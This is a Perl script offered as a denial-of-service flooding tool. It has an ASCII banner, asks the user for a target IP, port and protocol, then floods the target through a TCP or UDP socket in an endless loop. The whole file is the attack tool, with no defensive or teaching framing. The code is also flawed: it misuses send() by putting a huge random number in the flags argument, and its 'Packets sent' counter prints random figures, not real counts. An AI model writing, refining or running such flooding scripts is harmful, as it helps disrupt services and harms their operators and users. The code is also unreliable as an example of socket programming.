#!/usr/bin/perl

use IO::Socket;
system("clear || cls");
#Script Banner================================================================
print q{
                   .-"      "-.
                  /            \
                 |    DavLol89  |
                 |,  .-.  .-.  ,|
                 | )(__/  \__)( |
                 |/     /\     \|
       (@_       (_     ^^     _)
  _     ) \_______\__|IIIIII|__/__________________________
 (_)@8@8{}<________|-\IIIIII/-|_D_D_O_S_/_S_K_R_I_P_T_8_9_>
        )_/        \          /
       (@           `--------` Welcome!

 [---]   by:> Steal              [---]
 [---]   Version:>1.0            [---]
};
# INPUT TARGET INFO ==============================================
print "\n===============================";
print "\n[~] Ingresa La Ip: "; # Set Target IP
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Ingresa La Ip?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "TRAGET ==> $host";
print "\n===============================";
print "\n[~] Ingresa El Puerto: "; # Set Port
$port = <STDIN>;
chomp ($port);
while ($port eq ""){ 
 print "   [!] Ingresa El Puerto?: ";       
 $port = <STDIN>;
 chomp ($port); 
}
print "PORT ==> $port";
print "\n===============================";
print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] Enter Protockol (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocol ==> $proto";
print "\n===============================\n";
sleep(2);
{
$sock = IO::Socket::INET->new (
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Error: Connection Faild To Target[ $host ] !!!\n[!] Please Check Your Intenet Connection !\n[!] OR Mabye The Problem From TARGET Side !\n";
}

system("clear || cls");
print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep(3);

packets:
while (1) {
$size = rand() * 8921873 * 99919988;
print ("  Packets sent: $size\n");
send($sock, 9999999999999999999999, $size); 
packets2:
$size = rand() * 8921873 * 99919988 * 2;
print "Flooding:";
send($sock, 9999999999999999999999, $size);
packet3:
$size = rand() * 8921873 * 99919988 * 2 + 99919988;
print " (=>$host:$port~$proto<=)";
send($sock, $size, $size); # Attack start################

}

##############################################################
#####################                #########################
#####################  END OF SCRIPT #########################
#####################                #########################
##############################################################
#This Script by Steal
#Sigueme En Twitter
#GoodBye

